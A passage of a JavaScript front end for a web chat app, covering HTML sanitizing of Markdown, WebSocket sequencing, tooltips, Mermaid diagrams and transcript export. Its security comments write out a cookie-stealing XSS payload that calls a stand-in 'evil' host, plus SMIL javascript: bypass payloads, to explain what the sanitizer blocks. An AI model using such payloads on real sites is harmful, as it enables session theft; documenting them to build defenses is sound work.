// app/web/static/js/chat.js
import {
  initChatOnboarding,
  noteComposerSubmitted as onboardingNoteComposerSubmitted,
  onUserMessage as onboardingOnUserMessage,
  noteAnswered as onboardingNoteAnswered,
  noteTurnStarted as onboardingNoteTurnStarted,
  noteTurnEnded as onboardingNoteTurnEnded,
} from "./chat_onboarding.js";
import { initChatDashboard, updateDashboardSuggestions } from "./chat_dashboard.js";
import { applyInlineIcons, iconEl } from "./chat_icons.js";

const $ = (id) => document.getElementById(id);

// --- Safe Markdown rendering (security audit F3) --------------------------
// `marked` passes raw HTML straight through and ships no sanitizer, and the
// dashboard CSP does not restrict inline event handlers, so `marked.parse(x)`
// assigned to innerHTML is a stored-XSS sink: a chat message body like
//   ![x](x) <img src=x onerror=fetch('//evil/'+document.cookie)>
// authored by a co-presence peer executes in the victim's authenticated
// session. Route EVERY marked.parse()->innerHTML through renderMarkdownSafe(),
// which parses into an inert <template> (images don't fetch, handlers don't
// fire there), strips dangerous elements/attributes + unsafe URL schemes, and
// only then returns HTML for insertion. Never assign marked.parse() output to
// innerHTML directly again.
const _SAFE_URL_SCHEME_RE = /^(?:https?:|mailto:|tel:|#|\/|\.\/|\.\.\/|[^:]*$)/i;
// SMIL animation elements defeat the two checks below by deferring them to
// runtime: both operate on the attributes an element HAS, and SMIL sets an
// attribute it does not have. Measured against this sanitizer, all three of
// these survive it completely intact:
//   <a href="#x"><animate attributeName="href" values="javascript:…"></a>
//   <a><animate attributeName="xlink:href" to="javascript:…"></a>
//   <set attributeName="onload" to="…">
// The scheme allowlist never sees the first two — `values`/`to` are not
// URL-bearing attribute NAMES — and the `on*` strip never sees the third,
// because there the handler name is an attribute VALUE. `foreignObject` is
// HTML-in-SVG; its `<script>` and `on*` payloads are removed today, but it is
// the standard container in these chains and has no legitimate use in a chat
// message. None of this is reachable by an honest chart: measured on real
// matplotlib output, a figure contains zero SMIL elements and no
// foreignObject, so blocking them costs the chart channel nothing.
//
// This predates the chart work — <svg> was always allowed through — but that
// work makes inline SVG a routine, actively-instructed output shape, and the
// threat model is not matplotlib: a co-presence peer's message renders through
// this same path (see the header note above), and no prompt rule binds them.
const _DANGEROUS_TAGS = new Set([
  "script", "iframe", "object", "embed", "link", "meta",
  "style", "base", "form", "frame", "frameset", "template",
  "animate", "animatetransform", "animatemotion", "set", "foreignobject",
]);

function _sanitizeFragment(root) {
  root.querySelectorAll("*").forEach((el) => {
    if (_DANGEROUS_TAGS.has(el.tagName.toLowerCase())) {
      el.remove();
      return;
    }
    for (const attr of Array.from(el.attributes)) {
      const name = attr.name.toLowerCase();
      const value = attr.value || "";
      // Drop all inline event handlers (onerror=, onload=, onclick=, …).
      if (name.startsWith("on")) {
        el.removeAttribute(attr.name);
        continue;
      }
      // Constrain URL-bearing attributes to safe schemes; kill srcset entirely.
      if (name === "href" || name === "src" || name === "xlink:href") {
        if (!_SAFE_URL_SCHEME_RE.test(value.trim())) el.removeAttribute(attr.name);
      } else if (name === "srcset") {
        el.removeAttribute(attr.name);
      } else if (name === "style" && /url\s*\(|expression|javascript:/i.test(value)) {
        el.removeAttribute(attr.name);
      }
    }
  });
  return root;
}

function renderMarkdownSafe(text) {
  const tpl = document.createElement("template");
  // Parsing into a <template> is inert: no network fetches, no handler firing.
  tpl.innerHTML = marked.parse(text || "");
  _sanitizeFragment(tpl.content);
  // AFTER the sanitizer on purpose: the icon pass builds its <svg><use>
  // nodes itself from allowlisted names (see chat_icons.js), so it can add
  // nothing the sanitizer would need to see — while running it earlier would
  // let the sanitizer's attribute walk touch nodes this pass just vouched for.
  applyInlineIcons(tpl.content);
  return tpl.innerHTML;
}

let ws = null;
let currentChatId = null;
let inFlightToolCalls = new Map();
// Cards rendered by renderToolCallStart during the turn in progress. Collapsed
// in one pass once the turn ends (see _collapseFinishedToolCalls) so the
// transcript settles into answer + a scannable trail of "what ran" instead of
// a permanently-expanded dump of every stdout/stderr. Cleared by that same
// pass — a card belongs to exactly one turn's collapse.
let _currentTurnToolCards = [];
// tool_use_ids of in-flight preview tools. tool_result frames carry the call id
// in `frame.tool` (NOT the tool name — see runner._emit_tool_result), so a
// non-directive preview result (error / data_apps_disabled) is identified by
// tracking the ids from the suppressed tool_call, not by matching a name.
// call id -> bare tool name (tool_result frames carry no tool name)
const _previewToolCallIds = new Map();

// Per-session monotonic frame sequence tracking (wave-2F task 2). The
// server stamps every outbound WS frame with `seq` (monotonic int per
// chat_id) + `id` (see app.chat.frame_seq.stamp_frame) — this map tracks
// the highest `seq` seen per chat_id, for two things (wave-2F task 3):
//   1. openSession sends it back as `?last_seq=` on (re)connect so the
//      server can replay anything missed, or send `full_refresh` if it
//      can't confidently do that (see handleFrame's "full_refresh" case).
//   2. handleFrame uses it to drop a frame whose seq is <= the highest
//      already applied — a defensive dedup guard against the replay
//      window and the manager's own mid-turn turn_buffer resend
//      (app.chat.manager.ChatManager._seat_sink) ever overlapping.
// Frames without a numeric `seq` (older server, or a frame kind that
// isn't stamped) are simply skipped either way — "a client that ignores
// seq works exactly as today" still holds for those.
let lastSeenSeqByChat = new Map();
// Frame types whose handlers are idempotent (keyed by request_id) and
// which therefore must survive the seq-dedup guard on a reconnect replay.
const REPLAYABLE_FRAME_TYPES = new Set([
  "approval_request",
  "approval_resolved",
  "question_request",
  "question_resolved",
]);
// Approval cards the user has not answered yet, keyed by request_id. Same
// reason the server keeps them outside its turn buffer: a pending approval
// is not part of the transcript, so it must be re-rendered after ANY redraw
// of the transcript — a full_refresh reloads history asynchronously and
// wipes #chat-messages, which could otherwise erase a card that had just
// been replayed onto the socket (review finding on #1145).
const pendingApprovalFrames = new Map();
// Ids the user has already answered. A replayed request must not resurrect
// one: the durable replay stream re-sends the original request frame, and
// after a transcript wipe there is no DOM card left to dedup against.
const answeredApprovalIds = new Set();
// Question cards (AskUserQuestion round-trip) — same lifecycle rules as the
// approval maps above, kept separate because the render/resolve handlers
// differ.
const pendingQuestionFrames = new Map();
const answeredQuestionIds = new Set();

// §5.3 Co-presence: the current user's email for per-message sender attribution.
// Sourced from <body data-user-email="..."> set by the server-rendered template.
// Empty string for unauthenticated / anonymous views — co-presence degrades
// gracefully (no attribution rendered) in that case.
const currentUserEmail = document.body.dataset.userEmail || "";

// --- Cross-surface deep link (/chat?session=<id>) ------------------------
// chat.html's <body data-initial-session="<id>"> hook carries an optional
// session id from the ?session= query param. We open it ONCE on boot,
// after the sidebar cache is populated, and only if the user hasn't
// already navigated into a session (``!currentChatId``). Consumed once
// (set to null) so a later loadSidebar() refresh can't re-hijack the view.
// On an unknown / forbidden id, openSession proceeds (it sets currentChatId
// and clears the message pane) but its session-scoped endpoint calls
// (GET /sessions/{id}/messages, POST /sessions/{id}/ticket) fail their RBAC
// guards and surface a status message via setStatus — no page crash, no
// data leak; the view simply lands on an empty "Untitled chat" with an
// error status. (This is not a clean no-op: a bad deep link leaves the UI
// in an empty/error state, which is acceptable and RBAC-safe.)
let _initialSessionId = (document.body.dataset.initialSession || "").trim() || null;

/** Open the deep-linked session exactly once on boot. No-op if there's no
 *  deep link, if the user already opened a session, or after first use. */
function _maybeOpenInitialSession() {
  if (!_initialSessionId || currentChatId) return;
  const id = _initialSessionId;
  _initialSessionId = null;            // consume once — refreshes can't re-fire
  requestAnimationFrame(() => {
    if (currentChatId) return;          // re-check: a click may have raced in
    openSession(id);
  });
}

// Promise that resolves on the first ``ready`` / ``runner_ready`` frame from
// the server after we open a WebSocket. ``ws.readyState === 1`` (the TCP/HTTP
// handshake) does NOT mean the server-side ``ChatManager.attach`` has finished
// spawning the runner and populated ``live[chat_id]`` — that takes ~5 s for
// sandbox creation. If we send ``user_msg`` during that window the server
// raises ``SessionNotFound``, closes the WS with 4404, and the user sees
// "Disconnected — click the conversation again to resume." with no idea why.
// All ``user_msg`` sends now ``await`` this promise first.
let serverReadyPromise = null;
let resolveServerReady = null;
function resetServerReady() {
  serverReadyPromise = new Promise((r) => { resolveServerReady = r; });
}
resetServerReady();

// --- capability empty-state panel ---------------------------------
// Populated from a server-embedded JSON blob
// (``<script type="application/json" id="chat-capabilities-data">``).
// The previous shape fetched ``/api/catalog`` + ``/api/marketplaces``
// from JS, but those URLs were wrong / admin-only, so the panel always
// rendered "Catalog unavailable" / "No plugins" regardless of what the
// caller actually had access to. The server now resolves the RBAC-
// filtered view via ``_chat_capability_snapshot`` in
// ``app/web/router.py``, embeds the result here, and we render
// synchronously — no round-trip, no auth races.

function hideCapabilities() {
  const panel = $("chat-capabilities");
  if (panel) panel.hidden = true;
}
function showCapabilities() {
  const panel = $("chat-capabilities");
  if (panel) panel.hidden = false;
}

/** Set the chat-status banner with a visual tone.
 *  ``kind`` is one of "info" | "ok" | "warn" | "error". CSS maps each
 *  to a colored variant so a "Disconnected." line stands out from a
 *  "Connected." one. Clears any prior class when ``text`` is empty. */
function setStatus(text, kind = "info") {
  const el = $("chat-status");
  if (!el) return;
  el.textContent = text;
  el.classList.remove("is-info", "is-ok", "is-warn", "is-error");
  if (text) el.classList.add(`is-${kind}`);
}

/** A short, tinted line IN the transcript for events that end or interrupt a
 *  turn. The status bar clears on the next event; the transcript is what the
 *  reader scrolls back through — a turn that stopped early must say so where
 *  the reader is looking. */
function renderSystemNote(text, tone) {
  const note = document.createElement("div");
  note.className = `cloud-chat-system-note is-${tone === "error" ? "error" : "warn"}`;
  note.setAttribute("role", "status");
  note.textContent = text;
  $("chat-messages").appendChild(note);
  maybeScrollToBottom();
}

/** Show an ephemeral toast at the bottom-right. ``kind`` of "ok" /
 *  "warn" / "error" tints the chip. Auto-dismisses after 2.4s; can
 *  be dismissed early with a click. Multiple toasts stack. */
function showToast(text, kind = "ok", { durationMs = 2400 } = {}) {
  const stack = $("chat-toasts");
  if (!stack) return;
  const toast = document.createElement("div");
  toast.className = `cloud-chat-toast is-${kind}`;
  // No per-toast role="status" — the parent #chat-toasts already
  // carries aria-live="polite" which announces any appended child.
  // Stacking both was belt-and-suspenders that caused some screen
  // readers to double-announce.
  toast.textContent = text;
  const dismiss = () => {
    toast.classList.add("is-leaving");
    setTimeout(() => toast.remove(), 160);
  };
  toast.onclick = dismiss;
  stack.appendChild(toast);
  setTimeout(dismiss, durationMs);
}

/** Instant, styled tooltips for icon-only controls (`data-tip="..."`).
 *
 *  Replaces the native `title` attribute on the session-files drawer's
 *  actions. `title` has a ~1s browser delay, cannot be styled, and cannot be
 *  shown on keyboard focus — so the one sentence explaining what an icon
 *  does was, in practice, unreachable. That mattered most AFTER saving a
 *  file, where "open in Library" lived only in a `title` nobody saw.
 *
 *  The tooltip node is a single element on `document.body`, positioned
 *  `fixed`. It has to be: `.cloud-chat-files-list` is `overflow-y: auto`, so
 *  a tooltip rendered inside a row would be clipped by its own scroll
 *  container. Listeners are delegated from `document` because the file list
 *  is re-rendered on every refresh — per-node binding would leak and would
 *  miss rows added later.
 *
 *  Accessibility: the trigger keeps its own `aria-label` as its accessible
 *  name; while visible the tooltip is also wired up via `aria-describedby`,
 *  and it appears on `:focus-visible`, so a keyboard user gets what a mouse
 *  user gets. */
/** Where a tooltip bubble goes, as pure geometry — no DOM, so the flip and
 *  clamp rules are testable without jsdom.
 *
 *  `rect` is the trigger's viewport rect, `tip` the bubble's measured size,
 *  `view` the viewport. Returns `{top, left, below}`. Above is preferred; it
 *  flips below only when the bubble would not clear the top margin, and the
 *  horizontal centre is clamped so a control near either edge still shows a
 *  fully on-screen bubble. */
function _tipPosition(rect, tip, view, { offset = 8, margin = 8 } = {}) {
  const below = rect.top - tip.height - offset < margin;
  const top = below ? rect.bottom + offset : rect.top - tip.height - offset;
  const centred = rect.left + rect.width / 2 - tip.width / 2;
  const left = Math.max(margin, Math.min(centred, view.width - tip.width - margin));
  return { top: Math.round(top), left: Math.round(left), below };
}

const Tip = (() => {
  let node = null;
  let trigger = null;

  function ensure() {
    if (node) return node;
    node = document.createElement("div");
    node.className = "ds-tip";
    node.id = "ds-tip";
    node.setAttribute("role", "tooltip");
    node.hidden = true;
    document.body.appendChild(node);
    return node;
  }

  function place(el) {
    const { top, left, below } = _tipPosition(
      el.getBoundingClientRect(),
      node.getBoundingClientRect(),
      { width: window.innerWidth, height: window.innerHeight }
    );
    node.style.top = `${top}px`;
    node.style.left = `${left}px`;
    node.classList.toggle("is-below", below);
  }

  function show(el) {
    const text = el.getAttribute("data-tip");
    if (!text) return;
    ensure();
    trigger = el;
    node.textContent = text;
    node.hidden = false;
    el.setAttribute("aria-describedby", "ds-tip");
    place(el);
  }

  function hide() {
    if (!node || node.hidden) return;
    node.hidden = true;
    if (trigger) trigger.removeAttribute("aria-describedby");
    trigger = null;
  }

  function bind() {
    document.addEventListener("mouseover", (e) => {
      const el = e.target.closest && e.target.closest("[data-tip]");
      if (!el || el === trigger) return;
      show(el);
    });
    document.addEventListener("mouseout", (e) => {
      const el = e.target.closest && e.target.closest("[data-tip]");
      if (el && el === trigger) hide();
    });
    document.addEventListener("focusin", (e) => {
      const el = e.target.closest && e.target.closest("[data-tip]");
      if (el) show(el);
    });
    document.addEventListener("focusout", hide);
    // A tooltip anchored to a rect that has since moved is worse than none,
    // so any scroll or resize retires it rather than trying to re-follow.
    document.addEventListener("scroll", hide, true);
    window.addEventListener("resize", hide);
    document.addEventListener("click", hide, true);
    document.addEventListener("keydown", (e) => {
      if (e.key === "Escape") hide();
    });
  }

  return { bind, hide };
})();

Tip.bind();

/** Set the title strip above the messages area. Pass ``null`` to
 *  hide it (empty-state / new-chat shell), pass a string to show it.
 *  Long titles ellipsis via CSS. */
function setThreadTitle(title) {
  const header = $("chat-thread-header");
  const node = $("chat-thread-title");
  if (!header || !node) return;
  if (title) {
    node.textContent = title;
    header.hidden = false;
  } else {
    header.hidden = true;
  }
  // Mirror the active-conversation state onto the shell so the rail
  // layout can reveal the floating +New-chat button only inside a
  // thread (hidden in the empty state) — see chat.css.
  const shell = document.querySelector(".cloud-chat-shell");
  if (shell) shell.classList.toggle("has-thread", !!title);
  // Rail nav: the "New chat" item is "where you are" exactly when the
  // pre-conversation dashboard is showing (no thread) — it's the single chat
  // entry point and the rail landing item (there's no separate Dashboard item).
  // Server-rendered for the initial load (_app_rail.html); kept in sync here
  // across in-page open-session / new-chat transitions. Absent on topnav — no-op.
  const railNewChat = document.getElementById("new-chat");
  if (railNewChat) railNewChat.classList.toggle("on", !title);
}

// ---------- Mermaid diagrams ----------------------------------------------
// A ```mermaid fence becomes a rendered diagram. Two constraints shape how.
//
// 1. It must NOT go through renderMarkdownSafe. Mermaid's output carries a
//    <style> block that every one of its class-based colours depends on, and
//    `style` is in _DANGEROUS_TAGS — sanitizing mermaid's SVG would strip its
//    appearance and leave a grey skeleton. So the fence survives sanitization
//    as an ordinary code block (inert text), and only afterwards do we hand
//    the SOURCE to mermaid and insert what it returns. The untrusted thing is
//    the diagram source; `securityLevel: 'strict'` is mermaid's own answer to
//    it — HTML labels off, click handlers refused, label text escaped — and
//    that, not our sanitizer, is what stands between a hostile diagram and
//    the page.
// 2. It is 3.5 MB. Loaded once, on demand, the first time a diagram actually
//    appears in a thread — a user who never sees one never pays for it, which
//    is the only reason a dependency this size is tolerable here.
const _MERMAID_URL = "/static/vendor/mermaid.min.js";
let _mermaidReady = null;

function loadMermaid() {
  if (_mermaidReady) return _mermaidReady;
  _mermaidReady = new Promise((resolve, reject) => {
    const s = document.createElement("script");
    s.src = _MERMAID_URL;
    s.onload = () => (window.mermaid ? resolve(window.mermaid) : reject(new Error("mermaid absent after load")));
    s.onerror = () => reject(new Error("mermaid failed to load"));
    document.head.appendChild(s);
  }).then((m) => {
    m.initialize({
      startOnLoad: false,
      securityLevel: "strict",
      theme: document.documentElement.dataset.colorScheme === "dark" ? "dark" : "default",
      fontFamily: getComputedStyle(document.documentElement).getPropertyValue("--ds-font") || "inherit",
    });
    return m;
  });
  return _mermaidReady;
}

let _mermaidSeq = 0;

/** Swap every ```mermaid code block inside `root` for its rendered diagram.
 *  A block that fails to render KEEPS its source on screen with a short note:
 *  a diagram the agent got syntactically wrong is still information, and a
 *  silently blank space would read as a product fault rather than a bad
 *  diagram. */
function renderMermaidBlocks(root) {
  if (!root) return;
  const blocks = root.querySelectorAll("code.language-mermaid");
  if (!blocks.length) return;
  loadMermaid()
    .then(async (mermaid) => {
      for (const code of blocks) {
        const host = code.closest("pre") || code;
        const source = code.textContent || "";
        try {
          const { svg } = await mermaid.render(`ag-mmd-${++_mermaidSeq}`, source);
          const fig = document.createElement("div");
          fig.className = "msg-mermaid";
          // Deliberately not renderMarkdownSafe — see the note above.
          fig.innerHTML = svg;
          host.replaceWith(fig);
        } catch (err) {
          const note = document.createElement("div");
          note.className = "msg-mermaid-error";
          note.textContent = "This diagram could not be drawn; its source is below.";
          host.parentNode && host.parentNode.insertBefore(note, host);
        }
      }
      maybeScrollToBottom();
    })
    .catch(() => {
      /* Diagrams are additive: the fenced source stays readable. */
    });
}

// ---------- Sources block -------------------------------------------------
// The workspace prompt asks an answer that reports a figure to end with a
// fenced ```sources block. The server parses it and checks each table/metric
// claim against the turn's own tool calls (app/chat/sources.py); this renders
// that verdict and takes the raw fence off the screen.
//
// Borrowed shape, not borrowed rule: a mandated fenced trailer that the host
// lifts out and re-renders as chrome is how kai-agent does `next_actions`.
// The one place we deliberately diverge is the clipboard — kai strips its
// block when copying, because suggestions are chrome. Provenance is not: a
// transcript that dropped it would be exactly the report someone needs when
// they doubt a number, minus the part that answers them.
const _SOURCES_OPEN_RE = /```sources[ \t]*\r?\n/i;
const _SOURCES_CLOSE = "```";

/** Remove the raw fence(s) from rendered markdown. The block is a wire format
 *  between the agent and this renderer — showing it as a code block would put
 *  the machinery on screen next to the thing it produced.
 *
 *  The pattern is `g`: an answer that emits two provenance blocks used to
 *  have only its first removed, leaving the second on screen as raw
 *  machinery. (Devin Review.) Note `g` regexes carry `lastIndex` state across
 *  calls — safe here because `String.replace` with a `g` pattern resets it,
 *  but do not reuse this constant with `.test()`. */
function stripSourcesFence(markdown) {
  // `indexOf` for the body, not a non-greedy pattern. `[\s\S]*?```` rescans
  // to end-of-string for every unterminated opener, so a long reply full of
  // half-written markers cost work proportional to openers x length — the
  // same trap fixed server-side in `app/chat/sources.py`, and this is the
  // half that runs in the reader's browser on every message. An unterminated
  // opener is not a block: stopping there keeps a truncated answer from
  // swallowing everything after it. (Devin Review.)
  let out = markdown || "";
  for (;;) {
    const open = _SOURCES_OPEN_RE.exec(out);
    if (!open) break;
    const bodyStart = open.index + open[0].length;
    const close = out.indexOf(_SOURCES_CLOSE, bodyStart);
    if (close === -1) break;
    out = out.slice(0, open.index) + out.slice(close + _SOURCES_CLOSE.length);
  }
  return out.trimEnd();
}

const _CLAIM_LABEL = { table: "table", metric: "metric", assumption: "assumes" };

/** Chips under an assistant turn. `verdict` is the server's, never recomputed
 *  here — the client has no record of what actually ran, and a second opinion
 *  derived from less information would be worse than none. */
/** Did this answer render something a reader would want a source for?
 *  Checked in the DOM after rendering — mermaid may still be its `<pre>` at
 *  this point (rendering is async), so both forms count. */
function _bubbleHasFigure(bubble) {
  const body = bubble && bubble.querySelector(".msg-body");
  if (!body) return false;
  // Scoped to `.msg-body`, and CHROME is excluded: every code block gets a
  // copy button with an icon, so a bare `svg, img` query matched a plain
  // answer that merely contained a snippet — including greetings — and hung
  // "Sources — none declared" under it. Only marks that came from the
  // answer's own markdown count. (Devin Review.)
  const candidates = body.querySelectorAll("table, svg, img, pre.mermaid, .mermaid");
  for (const el of candidates) {
    if (el.closest("button, .msg-actions, .code-actions, .tool-block")) continue;
    return true;
  }
  return false;
}

function renderSourcesChips(bubble, verdict) {
  if (!verdict) return;
  const claims = verdict.claims || [];
  // Nothing declared AND nothing claimed: stay silent. "No source declared"
  // under a greeting or a clarifying question is noise, and the server cannot
  // tell a figure from a sentence. The honest signal is the one below —
  // shown only once an answer has claimed something, or has been asked to.
  // Nothing declared: normally silent, EXCEPT when the answer rendered a
  // figure. The comment above is right that the server cannot tell a figure
  // from a sentence — but this runs after the body is in the DOM, so the
  // client can: a table, a chart or an image is exactly the case this feature
  // exists to expose, and staying quiet there showed an unsourced figure as
  // an ordinary answer. A greeting still gets nothing. (Devin Review.)
  if (!verdict.declared && claims.length === 0 && !_bubbleHasFigure(bubble)) return;

  const wrap = document.createElement("div");
  wrap.className = "msg-sources";

  const label = document.createElement("span");
  label.className = "msg-sources-label";
  label.textContent = "Sources";
  wrap.appendChild(label);

  if (!claims.length) {
    const none = document.createElement("span");
    none.className = "msg-source-chip is-none";
    none.textContent = "none declared";
    wrap.appendChild(none);
    bubble.appendChild(wrap);
    return;
  }

  for (const c of claims) {
    const chip = document.createElement("span");
    // Three states, and the middle one is the point of the whole feature:
    // verified (a tool call supports it), unverified (the answer named
    // something nothing ran touched), and neutral (an assumption, which there
    // is nothing to check against).
    const state = c.verified === true ? "is-ok" : c.verified === false ? "is-unverified" : "is-neutral";
    chip.className = `msg-source-chip ${state}`;
    const kind = document.createElement("span");
    kind.className = "msg-source-kind";
    kind.textContent = _CLAIM_LABEL[c.kind] || c.kind;
    chip.appendChild(kind);
    chip.appendChild(document.createTextNode(c.ref));
    if (c.verified === false) {
      chip.title = "No tool call in this turn touched this — the answer named it, nothing ran on it.";
      const mark = document.createElement("span");
      mark.className = "msg-source-flag";
      mark.textContent = "unverified";
      chip.appendChild(mark);
    } else if (c.verified === true) {
      chip.title = "A tool call in this turn used this.";
    }
    wrap.appendChild(chip);
  }
  bubble.appendChild(wrap);
}

// ---------- Next-actions block ---------------------------------------------
// The workspace prompt asks the agent to end each answer with a fenced
// ```next_actions block — one short follow-up prompt per "- " line. Unlike
// the sources fence above, this trailer IS chrome: it is stripped from the
// clipboard too, and re-rendered as one-click buttons under the answer.
// Same loop shape as stripSourcesFence: global, unterminated-safe, indexOf
// for the close (a non-greedy pattern rescans to end-of-string per opener).
const _NEXT_ACTIONS_OPEN_RE = /```next_actions[ \t]*\r?\n/i;
const _NEXT_ACTIONS_CLOSE = "```";
const _NEXT_ACTIONS_MAX = 3;

function extractNextActions(markdown) {
  let out = markdown || "";
  const actions = [];
  for (;;) {
    const open = _NEXT_ACTIONS_OPEN_RE.exec(out);
    if (!open) break;
    const bodyStart = open.index + open[0].length;
    const close = out.indexOf(_NEXT_ACTIONS_CLOSE, bodyStart);
    if (close === -1) break;
    for (const line of out.slice(bodyStart, close).split("\n")) {
      const m = /^\s*[-*]\s+(.+?)\s*$/.exec(line);
      if (m) actions.push(m[1]);
    }
    out = out.slice(0, open.index) + out.slice(close + _NEXT_ACTIONS_CLOSE.length);
  }
  return { text: out.trimEnd(), actions: actions.slice(0, _NEXT_ACTIONS_MAX) };
}

/** True while the stream sits inside a trailer fence whose closing ``` has
 *  not arrived yet.
 *
 *  This is the window TCRD-213 is actually about. The `next_actions` chips are
 *  NOT a second LLM call made after streaming — they are a fenced trailer at
 *  the end of the SAME streamed answer, and `_streamingSafeText` deliberately
 *  withholds a half-open fence so raw ``` markup never flashes on screen. The
 *  consequence is that once the prose ends, tokens keep arriving for as long
 *  as the model spends on `sources` + `next_actions`, while the painted text
 *  cannot change. The turn is working; the screen cannot show it. A blinking
 *  caret under finished-looking prose is indistinguishable from a hang, which
 *  is exactly the "vypadá to, jako by se aplikace zasekla" report.
 *
 *  Scans to the LAST opener of either trailer and asks whether a close
 *  follows it, so a closed `sources` fence ahead of an still-open
 *  `next_actions` one is judged on the open one. */
function _inWithheldTrailer(text) {
  const s = text || "";
  let last = -1;
  for (const re of [_SOURCES_OPEN_RE, _NEXT_ACTIONS_OPEN_RE]) {
    const g = new RegExp(re.source, "gi");
    let m;
    while ((m = g.exec(s)) !== null) last = Math.max(last, m.index + m[0].length);
  }
  if (last === -1) return false;
  return s.indexOf("```", last) === -1;
}

function stripNextActionsFence(markdown) {
  return extractNextActions(markdown).text;
}

/** One-click follow-ups under the LATEST assistant answer. Exactly one chip
 *  row exists at a time — a new row (or a new user message) removes the old
 *  one, mirroring how suggestions age out the moment the conversation moves. */
// ---------- Facts scope line -------------------------------------------
// design doc §13.2 "Chat": "answered from N documents in M collections you
// can access" — the one line that lets a reader tell "we don't have it"
// apart from "you can't see it" after a fact-graph-using turn.

/** Append the end-of-turn scope line under an answer, when this turn's
 *  `fact_claims` tool results named at least one document.
 *
 *  MECHANISM, stated plainly: N/M are a purely CLIENT-SIDE tally of the
 *  `corpus_file_id`/`corpus_id` pairs already shown in this turn's rendered
 *  `fact_claims` result cards (`_turnFactDocumentIds` / `_turnFactCollectionIds`,
 *  filled by `_recordFactClaimsEvidence` as each tool_result frame arrives) —
 *  NOT a fresh server-side aggregate query. That makes it honest in one
 *  direction only: since every `fact_claims` call already ran through the
 *  caller-scoped repository (spec §5), the tally can never OVERCLAIM more
 *  than the caller can actually see — but it CAN undercount, e.g. an agent
 *  that called `fact_search`/`fact_neighbors` without ever reading evidence
 *  via `fact_claims` shows no line at all, same as a turn with no sources.
 *  Resets the tally after rendering — see `_resetFactsTurnEvidence`. */
function renderFactsScopeLine(bubble) {
  if (!bubble) return;
  const docCount = _turnFactDocumentIds.size;
  if (docCount > 0) {
    const colCount = _turnFactCollectionIds.size;
    const line = document.createElement("p");
    line.className = "msg-facts-scope";
    const docWord = docCount === 1 ? "document" : "documents";
    const colWord = colCount === 1 ? "collection" : "collections";
    line.textContent = `Answered from ${docCount} ${docWord} in ${colCount} ${colWord} you can access.`;
    bubble.appendChild(line);
  }
  _resetFactsTurnEvidence();
}

function renderNextActions(bubble, actions) {
  _clearNextActions();
  if (!bubble || !actions || actions.length === 0) return;
  const row = document.createElement("div");
  row.className = "cloud-chat-next-actions";
  for (const action of actions) {
    const btn = document.createElement("button");
    btn.type = "button";
    btn.className = "cloud-chat-next-action";
    btn.textContent = action;
    btn.addEventListener("click", () => {
      const ta = $("chat-input");
      if (!ta) return;
      ta.value = action;
      ta.focus();
      const form = $("chat-form");
      if (form) form.dispatchEvent(new SubmitEvent("submit", { cancelable: true }));
    });
    row.appendChild(btn);
  }
  // Live order is chips-then-actions (finalize renders chips BEFORE
  // attachMessageActions appends the row). On a history reload the actions
  // row already exists when the chips arrive — insert above it so both
  // paths agree about the bubble's tail.
  const actionsRow = bubble.querySelector(":scope > .msg-actions");
  if (actionsRow) bubble.insertBefore(row, actionsRow);
  else bubble.appendChild(row);
}

function _clearNextActions() {
  document.querySelectorAll(".cloud-chat-next-actions").forEach(el => el.remove());
}

/** The one way answer markdown reaches the DOM: both wire-format trailers
 *  removed, then sanitized. Streaming and both final render paths go through
 *  here so a fence can never reach the screen from one path and not another. */
function renderAnswerMarkdown(content) {
  return renderMarkdownSafe(stripNextActionsFence(stripSourcesFence(content)));
}

// ---------- Copy transcript ----------------------------------------------
// A chat session is owner-only by design: GET /api/chat/sessions/{id}/messages
// 404s for everyone else, admins included, and /admin/sessions browses the
// JSONLs collected from the CLI, not web chat. So a user who hits a wrong or
// broken answer has literally nothing to hand to whoever could look at it —
// "can I report this session?" had no answer. This is that answer: the whole
// thread on the clipboard as markdown.
//
// Read back from the API rather than scraped off the DOM. The rendered bubbles
// have already been through markdown → HTML, and the endpoint's `tool_calls`
// is the only provenance beyond raw prose.
//
// Rows DO carry real tool calls now. They did not until the manager started
// re-attaching the turn's `tool_call` frames to the final assistant message
// (it had to: the sources verdict is computed against them, and against an
// empty list every declared source read as unverified). They arrive trimmed
// to `{tool, args}`. Two other kinds of row still exist and are not tool
// calls at all: the cancelled/interrupted markers manager.py writes
// (`{"cancelled": true}`, `{"interrupted": true, "reason": …}`), which have
// no `tool` key. formatToolCall() below skips those rather than rendering
// `tool: undefined` with an empty fence.

/** One tool_calls[] entry as `{label, argsJson}`, or `null` for a row with no
 *  `tool` name — the shape of manager.py's cancelled/interrupted markers
 *  (`{"cancelled": true}`, `{"interrupted": true, "reason": …}`), which are
 *  the only `tool_calls` a persisted message ever actually carries today.
 *  Without this guard `tc.tool` is `undefined`, `JSON.stringify(undefined, …)`
 *  is also `undefined`, and both render as the literal string "undefined" /
 *  an empty fence. */
function formatToolCall(tc) {
  if (!tc || typeof tc.tool !== "string") return null;
  // Both the verb and the raw id: the DOM keeps the id in a tooltip, but the
  // markdown export has no tooltip — the copied record must still name which
  // tool actually ran, or the one artifact handed to a debugger goes vague.
  return { label: _toolLabel(tc.tool, tc.args), tool: tc.tool, argsJson: JSON.stringify(tc.args ?? {}, null, 2) };
}

/** Markdown transcript of one conversation. ``title`` must be captured by the
 *  caller BEFORE the first await — reading it here (off the live DOM, after
 *  the fetch below) let a conversation switch mid-export repaint
 *  #chat-thread-title out from under this call, pairing the new
 *  conversation's title with the old one's messages and session id. Throws
 *  on a failed fetch so the caller can distinguish "couldn't read it" from
 *  "couldn't copy it". */
async function fetchTranscriptMarkdown(chatId, title) {
  const res = await fetch(`/api/chat/sessions/${encodeURIComponent(chatId)}/messages`);
  if (!res.ok) throw new Error(`messages → ${res.status}`);
  const msgs = await res.json();
  const out = [`# ${title}`, "", `Session: \`${chatId}\``, `Exported: ${new Date().toISOString()}`, ""];
  for (const m of msgs) {
    const who = m.role === "user" ? "You" : m.role === "assistant" ? "Agnes" : m.role;
    out.push(`## ${who} · ${m.created_at}`, "", stripNextActionsFence((m.content || "").trim()), "");
    for (const tc of m.tool_calls || []) {
      const call = formatToolCall(tc);
      if (!call) continue;
      // Fenced, not inline: an `agnes query` argument is multi-line SQL, and
      // the point of carrying tool calls at all is that they stay readable.
      out.push(`<details><summary>tool: ${call.label} (${call.tool})</summary>`, "", "```json", call.argsJson, "```", "", "</details>", "");
    }
  }
  return out.join("\n");
}

function wireCopyTranscript() {
  const btn = $("chat-copy-transcript");
  if (!btn) return;
  btn.addEventListener("click", async () => {
    if (!currentChatId) return;
    const chatId = currentChatId;
